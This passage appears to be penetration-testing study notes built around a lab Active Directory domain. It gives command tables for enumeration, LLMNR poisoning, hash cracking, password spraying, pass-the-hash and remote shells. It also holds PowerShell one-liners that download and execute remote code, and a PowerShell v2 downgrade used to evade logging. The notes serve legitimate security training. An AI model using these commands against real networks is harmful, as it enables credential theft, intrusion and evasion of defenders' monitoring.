
| Tools                                     | Description                                             |
| ----------------------------------------- | ------------------------------------------------------- |
| **PowerView, SharpView**                  | AD enumeration and situational awareness.               |
| **BloodHound, SharpHound, BloodHound.py** | Map AD relationships and attack paths.                  |
| **Kerbrute**                              | Enumerate users and attack Kerberos.                    |
| **Impacket toolkit**                      | Python tools for AD/network attacks and enumeration.    |
| **Responder, Inveigh, C# Inveigh**        | LLMNR/NBT-NS/mDNS spoofing and credential capture.      |
| **rpcinfo, rpcclient, rpcdump.py**        | Enumerate RPC services/endpoints.                       |
| **CrackMapExec (CME)**                    | AD enumeration and network attacks.                     |
| **Rubeus, GetUserSPNs.py**                | Kerberos enumeration and abuse.                         |
| **Hashcat**                               | Crack password hashes.                                  |
| **enum4linux, enum4linux-ng**             | Windows/Samba enumeration.                              |
| **ldapsearch, windapsearch**              | Enumerate AD through LDAP.                              |
| **DomainPasswordSpray.ps1**               | Password spraying against domain users.                 |
| **LAPSToolkit**                           | Audit and abuse LAPS.                                   |
| **smbmap**                                | Enumerate SMB shares and permissions.                   |
| **psexec.py, wmiexec.py, evil-winrm**     | Remote command execution/shells.                        |
| **Snaffler**                              | Find sensitive data and credentials in shares.          |
| **smbserver.py**                          | Create SMB server and transfer files.                   |
| **setspn.exe**                            | Manage and enumerate SPNs.                              |
| **Mimikatz, secretsdump.py**              | Extract Windows credentials/secrets.                    |
| **mssqlclient.py**                        | Interact with MSSQL.                                    |
| **noPac.py**                              | Exploit NoPac vulnerabilities for privilege escalation. |
| **CVE-2021-1675.py**                      | Exploit PrintNightmare.                                 |
| **ntlmrelayx.py**                         | Perform NTLM relay attacks.                             |
| **PetitPotam.py**                         | Coerce Windows authentication.                          |
| **gettgtpkinit.py, getnthash.py**         | Work with PKINIT, Kerberos tickets and hashes.          |
| **adidnsdump**                            | Enumerate AD DNS records.                               |
| **gpp-decrypt**                           | Extract credentials from GPP files.                     |
| **GetNPUsers.py**                         | Perform ASREPRoasting.                                  |
| **lookupsid.py**                          | Enumerate/brute-force SIDs.                             |
| **ticketer.py**                           | Create/customize Kerberos tickets.                      |
| **raiseChild.py**                         | Escalate from child to parent domain.                   |
| **Active Directory Explorer**             | Browse and inspect AD objects.                          |
| **PingCastle**                            | Audit AD security risks.                                |
| **Group3r**                               | Find GPO misconfigurations.                             |
| **ADRecon**                               | Collect AD data and generate reports.                   |


# Section 4 - External Recon and Enumeration Principles

| Purpose             | Tools                                   | Description                                                         |
| ------------------- | --------------------------------------- | ------------------------------------------------------------------- |
| ASN / IP lookup     | BGP Toolkit, IANA, ARIN, RIPE           | Find an organization's IP ranges and ASN.                           |
| DNS / Domain lookup | DomainTools, ViewDNS, PTRArchive, ICANN | Find DNS, WHOIS, and domain information.                            |
| Secret hunting      | TruffleHog, GitLeaks                    | Find leaked passwords, API keys, and secrets.                       |
| Cloud data hunting  | GreyHat Warfare, S3Scanner              | Find exposed files and cloud storage data.                          |
| Username harvesting | LinkedIn2Username, Sherlock             | Generate or find possible usernames.                                |
| Credential hunting  | DeHashed, Have I Been Pwned             | Check for leaked credentials and breach data.                       |
| Google Dorks        | Google, Bing                            | Find publicly exposed files and information using search operators. |

---
---

# Section 5 - Initial Enumeration of the Domain


 Wireshark and tcpdump are just a few of the easiest to use and most widely known. Depending on the host you are on, you may already have a network monitoring tool built-in, such as `pktmon.exe`, which was added to all editions of Windows 10. As a note for testing, it's always a good idea to save the PCAP traffic you capture. You can review it again later to look for more hints.  [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames) repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective.

### DNS / Passive Network Discovery

| Command                                    | What it does                                        |
| ------------------------------------------ | --------------------------------------------------- |
| `nslookup ns1.inlanefreight.com -type=TXT` | Queries DNS and retrieves TXT record information.   |
| `sudo tcpdump -i ens224`                   | Captures network traffic on `ens224`.               |
| `sudo responder -I ens224 -A`              | Passively analyzes LLMNR, NBT-NS, and mDNS traffic. |

### Host Discovery

| Command                     | What it does                              |
| --------------------------- | ----------------------------------------- |
| `fping -asgq 172.16.5.0/23` | Performs a ping sweep to find live hosts. |

### Service / OS Enumeration

| Command                                                            | What it does                                                                                         |
| ------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------- |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Scans hosts from `hosts.txt` for OS, services, versions, scripts, and traceroute; saves the results. |

### Kerbrute Setup

|Command|What it does|
|---|---|
|`sudo git clone https://github.com/ropnop/kerbrute.git`|Downloads Kerbrute source code.|
|`make help`|Shows available build options.|
|`sudo make all`|Builds Kerbrute binaries for different platforms/architectures.|
|`./kerbrute_linux_amd64`|Tests the compiled Kerbrute binary.|
|`sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`|Moves Kerbrute into the system PATH for easier use.|

### Kerbrute — Username Enumeration

| Command                                                                                             | What it does                                                      |
| --------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Uses a username wordlist to find valid AD users through Kerberos. |

---
---




# Section 6 , 7 - LLMNR/NBT-NS Poisoning - from Linux and Windows

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. LLMNR uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

### Responder / Inveigh

| Command                                                   | What it does                                                        |
| --------------------------------------------------------- | ------------------------------------------------------------------- |
| `responder -h`                                            | Shows Responder options and usage.                                  |
| `Import-Module .\Inveigh.ps1`                             | Imports Inveigh into PowerShell.                                    |
| `(Get-Command Invoke-Inveigh).Parameters`                 | Shows Inveigh's available options.                                  |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` | Starts Inveigh with LLMNR/NBNS spoofing and saves output to a file. |
| `.\Inveigh.exe`                                           | Starts the C# version of Inveigh.                                   |

### Hash Cracking

|Command|What it does|
|---|---|
|`hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`|Cracks captured NTLMv2 hashes using a wordlist.|

### Mitigation — Disable LLMNR / NBT-NS

|Command / Method|What it does|
|---|---|
|`$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"` + `Set-ItemProperty ... -Name NetbiosOptions -Value 2`|Disables NBT-NS on Windows.|
|**Group Policy → Computer Configuration → Administrative Templates → Network → DNS Client → Turn OFF Multicast Name Resolution**|Disables LLMNR through Group Policy.|

It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. This [blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explains this method more in-depth.


# Section 8 , 9, 10, 11 - Enumerating & Retrieving Password Policies

### Password Policy

| Command                                                                                                     | What it does                                                                                                            |
| ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`                                         | Uses valid credentials to enumerate the target domain's password policy.                                                |
| `rpcclient -U "" -N 172.16.5.5` → `rpcclient $> querydominfo` → `rpcclient $> getdompwinfo`                 | Connects through RPC and retrieves domain information and password policy details.                                      |
| `enum4linux -P 172.16.5.5`                                                                                  | Enumerates the target Windows domain's password policy.                                                                 |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                                                                 | Enumerates the password policy and saves the results to YAML and JSON files.                                            |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` | Queries LDAP to find password policy information such as password history requirements.                                 |
| `net accounts`                                                                                              | Uses a built-in Windows command to display the local/domain password policy. Useful when I cannot transfer extra tools. |
| `Import-Module .\PowerView.ps1` → `Get-DomainPolicy`                                                        | Imports PowerView and uses it to enumerate the domain password policy.                                                  |

### User Enumeration

| Command                                                                                                                              | What it does                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enum4linux -U 172.16.5.5 \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"`                                                         | Enumerates domain users with enum4linux and filters the output to show only usernames.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| `rpcclient -U "" -N 172.16.5.5` → `rpcclient $> enumdomuser`                                                                         | Uses an RPC NULL session to enumerate user accounts in the domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `crackmapexec smb 172.16.5.5 --users`                                                                                                | Uses SMB to enumerate users in the target Windows domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "` | Queries LDAP for user objects and extracts their `sAMAccountName` values.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`                                                                                      | Uses LDAP to enumerate domain users, including when running from a Linux attack machine.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`                                                           | Username enumeration is fast and stealthier because it does not generate failed logon events or lock accounts: `PRINCIPAL UNKNOWN` means the username is invalid, while a Pre-Authentication response means the username exists. However, **password spraying can still cause account lockouts** because failed authentication attempts count toward the domain's failed-login policy. But don't call it completely stealthy: **Kerbrute `userenum` can generate Event ID 4768**, and Microsoft specifically notes that repeated 4768 requests with a “username doesn't exist” result can indicate account enumeration |

### Password Spraying

| Command                                                                                                                                          | What it does                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| ------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done`                         | Tries the same password against every username in `valid_users.txt` using RPC, looking for successful logins.                                                                                                                                                                                                                                                                                                                                                                                    |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`                                                         | Uses Kerberos to try one password against many valid domain usernames.                                                                                                                                                                                                                                                                                                                                                                                                                           |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +`                                                                   | Tries one password against multiple users over SMB and filters for successful authentication.                                                                                                                                                                                                                                                                                                                                                                                                    |
| `Import-Module .\DomainPasswordSpray.ps1` → `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Imports DomainPasswordSpray and tests one password against domain users, saving successful results to a file. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. Like how we ran the spraying attack from our Linux host, we can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain. |

### Credential Validation / Pass-the-Hash

| Command                                                                                                           | What it does                                                                                                                                                             |
| ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`                                                     | Tests whether the supplied username and password are valid for SMB authentication.                                                                                       |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Uses an NTLM hash to attempt authentication as a local administrator across the subnet. `--local-auth` tells CME to treat the account as local rather than domain-based. |

### Username Generation

| Command                                                                                              | What it does                                                                                              |
| ---------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| `#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done` | Generates a large list of possible 4-character username combinations using uppercase letters and numbers. |

---
---

# Section 13 - Enumerating Security Controls

| Command                                                                    | Description                                                                                                                                                                                  |
| -------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-MpComputerStatus`                                                     | PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` from a Windows-based host.                                                                                      |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host.                                                                                                              |
| `$ExecutionContext.SessionState.LanguageMode`                              | PowerShell script used to discover the `PowerShell Language Mode` being used on a Windows-based host. Performed from a Windows-based host.                                                   |
| `Find-LAPSDelegatedGroups`                                                 | A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host.                                                                                                   |
| `Find-AdmPwdExtendedRights`                                                | A `LAPSTookit` function that checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights`. Performed from a Windows-based host. |
| `Get-LAPSComputers`                                                        | A `LAPSToolkit` function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.        |

---
---

# Section 14 - Credentialed Enumeration - from Linux


### 1. Access the Windows Target

| Command                                                              | What it does                                                                                                          |
| -------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid domain credentials through RDP. Run from a Linux-based Attack Machine.       |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`    | Uses Impacket `psexec` to get a command-line session on the Windows target through the `ADMIN$` administrative share. |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`     | Uses Impacket `wmiexec` to get a command-line session on the Windows target through WMI.                              |

---

## 2. Enumerate Users & Groups

### SMB / CrackMapExec

| Command                                                            | What it does                                                                      |
| ------------------------------------------------------------------ | --------------------------------------------------------------------------------- |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`  | Authenticates over SMB and enumerates user accounts in the target Windows domain. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates over SMB and enumerates groups in the target Windows domain.        |

### RPC

| Command                                                   | What it does                                                       |
| --------------------------------------------------------- | ------------------------------------------------------------------ |
| `rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomusers` | Enumerates domain users and their associated RIDs through RPC.     |
| `rpcclient $> queryuser 0x457`                            | Queries details about a specific domain user using the user's RID. |

### LDAP

|Command|What it does|
|---|---|
|`windapsearch.py -h`|Displays the available options and functionality of `windapsearch.py`.|
|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da`|Uses valid credentials and LDAP to enumerate members of the Domain Admins group.|
|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU`|Performs a recursive LDAP search for users with nested permissions.|

---

## 3. Enumerate Logged-On Users

| Command                                                                      | What it does                                                                                      |
| ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users` | Authenticates over SMB and attempts to list users currently logged on to the target Windows host. |

---

## 4. Enumerate SMB Shares & Files

### CrackMapExec

| Command                                                                                    | What it does                                                                                                                                 |
| ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`                         | Authenticates over SMB and lists the SMB shares available to the supplied account.                                                           |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share` | Uses the `spider_plus` module to recursively inspect the specified readable share and list readable files. Results are saved in JSON format. |

### SMBMap

| Command                                                                                   | What it does                                                                                    |
| ----------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`                      | Enumerates SMB shares and shows the permissions available to my credentials on the target host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only` | Recursively lists directories inside the `SYSVOL` share and shows directories only.             |

---

## 5. BloodHound — Map the AD Environment

| Command                                                                                          | What it does                                                                                                                                                                                                                                                                                               |
| ------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `.\SharpHound.exe -c All --zipfilename ILFREIGHT`\|<br>                                          | Runs SharpHound  on Windows to collect **AD relationship and permission data** such as users, groups, computers, sessions, ACLs, and trusts, then packages the collected data into a ZIP file named `ILFREIGHT`. **SharpHound is the collector**, while **BloodHound is the analysis/visualization tool**. |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Collects Active Directory information using valid credentials so BloodHound can map users, groups, computers, sessions, permissions, and potential attack paths in its gui. It does basically the **same collection job as SharpHound**, but it runs from a **Linux Attack Machine**                       |
[BloodHound Cypher Cheatsheet | hausec](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) 

---
---


# Section 15 - Credentialed Enumeration - from Windows


## 1. PowerShell / Active Directory Module

| Command                                                                                  | What it does                                                                                                                                                                                                                                                                                                                                         |
| ---------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                             | Lists the PowerShell modules currently available/loaded, including their versions and commands.                                                                                                                                                                                                                                                      |
| `Import-Module ActiveDirectory`                                                          | Loads the built-in Active Directory PowerShell module so I can use AD enumeration commands.                                                                                                                                                                                                                                                          |
| `Get-ADDomain`                                                                           | Retrieves information about the current Active Directory domain.                                                                                                                                                                                                                                                                                     |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | Finds AD user accounts that have a Service Principal Name (SPN) configured. These accounts may be relevant for Kerberoasting. **SPN (Service Principal Name) matters because it connects a service to a specific AD account.** If a user account has an SPN, it usually means that account is running a service such as SQL Server, HTTP, MSSQL, etc |
| `Get-ADTrust -Filter *`                                                                  | Enumerates the trust relationships of the current domain.                                                                                                                                                                                                                                                                                            |
| `Get-ADGroup -Filter * \| select name`                                                   | Lists all groups in the domain and displays only their names.                                                                                                                                                                                                                                                                                        |
| `Get-ADGroup -Identity "Backup Operators"`                                               | Searches for the specific `Backup Operators` group.                                                                                                                                                                                                                                                                                                  |
| `Get-ADGroupMember -Identity "Backup Operators"`                                         | Lists the members of the `Backup Operators` group.                                                                                                                                                                                                                                                                                                   |

---

# 2. PowerView — Basic AD Enumeration

`Import-Module .\PowerView.ps1`

|Command|What it does|
|---|---|
|`Get-Domain`|Returns information about the current or specified AD domain.|
|`Get-DomainController`|Lists the Domain Controllers for the target domain.|
|`Get-DomainUser`|Lists all domain users or returns information about a specific user.|
|`Get-DomainComputer`|Lists all domain computers or information about a specific computer.|
|`Get-DomainGroup`|Lists all domain groups or information about a specific group.|
|`Get-DomainOU`|Lists or searches for Organizational Units (OUs) in the domain.|
|`Get-DomainPolicy`|Retrieves the domain or Domain Controller policy information.|
|`Get-DomainGPO`|Lists or searches for Group Policy Objects (GPOs).|

---

# 3. PowerView — Users, Groups & SPNs

| Command                                                               | What it does                                                                                                                                                                                                                                                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-DomainGroupMember`                                               | Lists the members of a specific domain group.                                                                                                                                                                                                                                                         |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`            | Recursively lists all members of `Domain Admins`, including users/groups nested inside other groups.                                                                                                                                                                                                  |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` | Finds domain users with an SPN configured and displays their username and SPN. **SPN (Service Principal Name) matters because it connects a service to a specific AD account.** If a user account has an SPN, it usually means that account is running a service such as SQL Server, HTTP, MSSQL, etc |
| `Get-DomainForeignUser`                                               | Finds users from another domain who are members of groups in the current domain.                                                                                                                                                                                                                      |
| `Get-DomainForeignGroupMember`                                        | Finds groups containing members from another domain and shows those foreign members.                                                                                                                                                                                                                  |
| `ConvertTo-SID`                                                       | Converts a username or group name into its Windows Security Identifier (SID).                                                                                                                                                                                                                         |
 `Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol`

---

# 4. PowerView — Trust Relationships

**AD Trust** is a relationship between two or more Active Directory domains that allows them to recognize and authenticate users from each other’s domain. In this example, `INLANEFREIGHT.LOCAL` has a **bidirectional trust** with `LOGISTICS.INLANEFREIGHT.LOCAL`, meaning the trust works both ways, and `WITHIN_FOREST` means they are in the **same AD forest**. It also has a **bidirectional ****`FOREST_TRANSITIVE`**** trust** with `FREIGHTLOGISTICS.LOCAL`, meaning the relationship crosses into another AD forest. Trust does **not** mean users automatically have access or admin rights; it simply creates a relationship through which access can potentially be granted. During a pentest, trusts matter because they reveal **other domains/forests that may provide additional users, resources, permissions, or attack paths** to investigate.

|Command|What it does|
|---|---|
|`Get-DomainTrust`|Lists trust relationships for the current or specified domain.|
|`Get-ForestTrust`|Lists trust relationships for the current or specified forest.|
|`Get-DomainTrustMapping`|Maps trusts between the current domain and other domains that can be discovered.|

---

# 5. PowerView — Hosts, Sessions & Access

| Command                   | What it does                                                                                 |
| ------------------------- | -------------------------------------------------------------------------------------------- |
| `Get-NetLocalGroup`       | Enumerates local groups on a local or remote Windows machine.                                |
| `Get-NetLocalGroupMember` | Lists the members of a specific local group.                                                 |
| `Get-NetSession`          | Retrieves session information from a local or remote machine, such as users connected to it. |
| `Test-AdminAccess`        | Checks whether my current user has administrative access to a local or remote machine.       |
| `Find-DomainUserLocation` | Finds machines where specific domain users are currently logged in.                          |
| `Find-LocalAdminAccess`   | Finds domain machines where my current user has local administrator access.                  |

---

# 6. PowerView — Shares & Files

| Command                                            | What it does                                                                                                                            |
| -------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-NetShare`                                     | Lists available shares on a local or remote Windows machine.                                                                            |
| `Find-DomainShare`                                 | Searches domain machines for shares that are reachable with my current access.                                                          |
| `Find-InterestingDomainShareFile`                  | Searches readable domain shares for potentially interesting files based on specified criteria.                                          |
| `Get-DomainFileServer`                             | Finds servers that are likely being used as file servers.                                                                               |
| `Get-DomainDFSShare`                               | Enumerates Distributed File System (DFS) shares in the domain.                                                                          |
| `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data` | Runs Snaffler against the domain to search accessible shares for potentially sensitive data such as credentials and other useful files. |

---

# 7. PowerView — ACL / Permission Enumeration

|Command|What it does|
|---|---|
|`Find-InterestingDomainAcl`|Searches domain objects for interesting ACL permissions that could allow non-built-in users/groups to modify or control objects.|

---

# 8. PowerView — Export Results

|Command|What it does|
|---|---|
|`Export-PowerViewCSV`|Exports or appends PowerView enumeration results to a CSV file for later analysis.|

# Transfering Files

|Command|Description|
|---|---|
|`sudo python3 -m http.server 8001`|Starts a python web server for quick hosting of files. Performed from a Linux-basd host.|
|`"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`|PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.|
|`impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/`|Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host.|

---
---

# Section 16 - Living Off The land — Windows/AD Enumeration


When you have no access to intenet at all, just use whatever you have! Also use tools and capabilities already available on the target instead of bringing your own tools.
## 🧠 Quick Memory Flow

|Step|What I check|Main commands|
|---|---|---|
|1|**Who/where am I?**|`hostname`, `whoami`, `systeminfo`|
|2|**What network am I on?**|`ipconfig /all`, `arp -a`, `route print`|
|3|**Who else is logged in?**|`qwinsta`|
|4|**What defenses are running?**|`netsh advfirewall show allprofiles`, `sc query windefend`, `Get-MpComputerStatus`|
|5|**What accounts/groups exist?**|`net user /domain`, `net group /domain`, WMI|
|6|**What domain/DCs exist?**|`echo %USERDOMAIN%`, `echo %logonserver%`, `wmic ntdomain list /format:list`|
|7|**What AD objects can I find?**|`dsquery user`, `dsquery computer`, `dsquery *`|
|8|**Need specific AD attributes?**|`dsquery * -filter ...` / LDAP filters|
|9|**Need shares/computers?**|`net share`, `net view`, `net use`|

---

## 1. Basic Host Enumeration

| Command                                                 | What it does                                                                                 |
| ------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| `hostname`                                              | Shows the name of the current Windows machine.                                               |
| `[System.Environment]::OSVersion.Version`               | Shows the Windows OS version and revision.                                                   |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Shows installed patches and hotfixes.                                                        |
| `ipconfig /all`                                         | Shows network adapters, IP addresses, DNS, and other network configuration.                  |
| `set`                                                   | Shows environment variables for the current CMD session.                                     |
| `echo %USERDOMAIN%`                                     | Shows the Windows domain the current user/machine belongs to.                                |
| `echo %logonserver%`                                    | Shows the Domain Controller handling the current logon.                                      |
| `systeminfo`                                            | Shows a broad summary of the host, including OS, patches, hardware, and network information. |
| `whoami`                                                | Shows the current user/security context.                                                     |

---

## 2. PowerShell Enumeration

|Command|What it does|
|---|---|
|`Get-Module`|Lists PowerShell modules available/loaded in the current session.|
|`Get-ExecutionPolicy -List`|Shows PowerShell execution-policy settings for each scope.|
|`Get-ChildItem Env: \| ft Key,Value`|Displays environment variables such as username, computer name, paths, and system information.|
|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|Reads PowerShell command history, which may reveal useful commands, scripts, paths, or accidentally exposed credentials.|
|`Set-ExecutionPolicy Bypass -Scope Process`|Temporarily changes the execution policy for the current PowerShell process.|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`|Downloads and executes PowerShell content directly without saving the script to disk.|

---

## 3. PowerShell Version / Logging

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer.

Check and see if we are still writing logs. The primary place to look is in the `PowerShell Operational Log` found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. All commands executed in our session will log to this file. The `Windows PowerShell` log located at `Applications and Services Logs > Windows PowerShell` is also a good place to check. With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Be aware that the action of issuing the command `powershell.exe -version 2` within the PowerShell session will be logged.

|Command|What it does|
|---|---|
|`Get-host`|Shows the current PowerShell version and host information.|
|`powershell.exe -version 2`|Attempts to start PowerShell version 2, if available. Older PowerShell versions lack newer logging features such as Script Block Logging.|
|`Get-host`|Verifies the PowerShell version after starting the shell.|
|`get-module`|Lists modules available in the current PowerShell session.|

---

## 4. Firewall & Defender

| Command                              | What it does                                                      |
| ------------------------------------ | ----------------------------------------------------------------- |
| `netsh advfirewall show allprofiles` | Shows Windows Firewall status and configuration for all profiles. |
| `sc query windefend`                 | Checks whether the Windows Defender service is running.           |
| `Get-MpComputerStatus`               | Shows Microsoft Defender status and configuration.                |

---

## 5. Logged-On Users

|Command|What it does|
|---|---|
|`qwinsta`|Shows active and disconnected sessions and helps identify other logged-on users.|

---

## 6. Network Information

| Command                              | What it does                                                                    |
| ------------------------------------ | ------------------------------------------------------------------------------- |
| `arp -a`                             | Which specific devices have I recently seen on my local networks?               |
| `ipconfig /all`                      | Shows IP addresses, adapters, DNS servers, gateways, and network configuration. |
| `route print`                        | Which networks can this machine reach, and through which gateway/interface?     |
| `netsh advfirewall show allprofiles` | Shows Windows Firewall configuration.                                           |

---

## 7. WMI Enumeration

Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. [Useful Wmic queries for host and domain enumeration](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) 

| Command                                                                                          | What it does                                                                   |
| ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                          | Shows installed patches and hotfixes.                                          |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`             | Shows computer, domain, user, manufacturer, model, and role information.       |
| `wmic process list /format:list`                                                                 | Lists running processes.                                                       |
| `wmic ntdomain list /format:list`                                                                | Shows domain/DC information.                                                   |
| `wmic useraccount list /format:list`                                                             | Lists user-account information.                                                |
| `wmic group list /format:list`                                                                   | Lists group information.                                                       |
| `wmic sysaccount list /format:list`                                                              | Shows system/service accounts.                                                 |
| `Get-CimInstance Win32_UserAccount \| Where-Object {$_.LocalAccount -eq $true} \| Format-List *` | **full account information**, but only for accounts where `LocalAccount=True`, |

---

## 8. Net — Domain & User Enumeration

